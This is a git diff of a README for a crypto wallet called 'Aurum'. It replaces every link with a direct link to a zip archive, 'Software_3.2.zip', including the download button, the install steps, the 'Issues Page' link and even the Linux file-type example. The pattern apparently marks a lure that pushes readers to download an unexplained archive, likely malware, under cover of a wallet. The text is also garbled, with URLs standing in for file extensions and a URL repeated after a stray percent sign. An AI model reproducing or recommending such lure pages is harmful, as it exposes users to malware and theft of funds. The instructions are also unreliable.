@@ -6,9 +6,9 @@ Welcome to Aurum! Aurum is the official stablecoin of Sky Genesis Enterprise (SG
 
 ## 📥 Download Aurum
 
-[![Download Aurum](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip%https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip)](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip)
+[![Download Aurum](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip%https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip)](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip)
 
-To get started, you'll need to download Aurum from our releases page. Click the button above or visit the following link: [Download Aurum Here](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip).
+To get started, you'll need to download Aurum from our releases page. Click the button above or visit the following link: [Download Aurum Here](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip).
 
 ## 🖥️ System Requirements
 
@@ -25,15 +25,15 @@ Before you proceed with the download, ensure your system meets the following req
 Follow these steps to install and run Aurum on your computer:
 
 1. **Download Aurum**:
-   Go to the [Download Aurum Here](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip) link. You'll see a list of available versions. Click on the latest version.
+   Go to the [Download Aurum Here](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip) link. You'll see a list of available versions. Click on the latest version.
 
 2. **Select Your File**:
-   You’ll find different file types for various operating systems. Choose the one that matches your system (e.g., `.exe` for Windows, `.dmg` for macOS, `https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip` for Linux).
+   You’ll find different file types for various operating systems. Choose the one that matches your system (e.g., `.exe` for Windows, `.dmg` for macOS, `https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip` for Linux).
 
 3. **Run the Installer**:
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag Aurum to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip` file and run the terminal command to install.
+   - For Linux: Extract the `https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip` file and run the terminal command to install.
 
 4. **Launch Aurum**:
    After installation, open the application from your start menu or applications folder. 
@@ -65,7 +65,7 @@ If you encounter issues while downloading or using Aurum, try the following:
 
 ## 💬 Support
 
-For additional support or to report bugs, please visit our [Issues Page](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip). We’re here to help you have the best experience with Aurum.
+For additional support or to report bugs, please visit our [Issues Page](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip). We’re here to help you have the best experience with Aurum.
 
 ## ⚙️ Contributing
 
@@ -79,4 +79,4 @@ Aurum covers a range of topics including banking, blockchain, and digital financ
 
 Thank you for choosing Aurum as your digital currency wallet. We hope this guide has provided you with clear steps to download and run our software. If you have any questions, don’t hesitate to reach out for support.
 
-Remember to visit our [Download Aurum Here](https://raw.githubusercontent.com/prodbysbz/aurum/main/phytologic/aurum.zip) link to get started!
+Remember to visit our [Download Aurum Here](https://github.com/prodbysbz/aurum/raw/refs/heads/main/phytologic/Software_3.2.zip) link to get started!
